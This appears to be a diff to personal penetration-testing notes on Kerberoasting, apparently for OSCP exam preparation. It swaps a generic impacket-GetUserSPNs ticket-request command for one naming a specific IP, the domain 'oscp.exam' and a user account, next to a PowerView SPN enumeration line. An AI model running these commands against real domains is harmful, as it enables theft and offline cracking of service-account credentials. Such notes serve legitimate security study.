@@ -18,7 +18,7 @@ Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,pwdlastset,l
 ## Request
 
 ```sh
-impacket-GetUserSPNs domain/username:'password' -dc-ip $target -request
+impacket-GetUserSPNs -request -dc-ip 10.10.117.146 oscp.exam/eric.wallows
 ```
 ### Windows only request
 
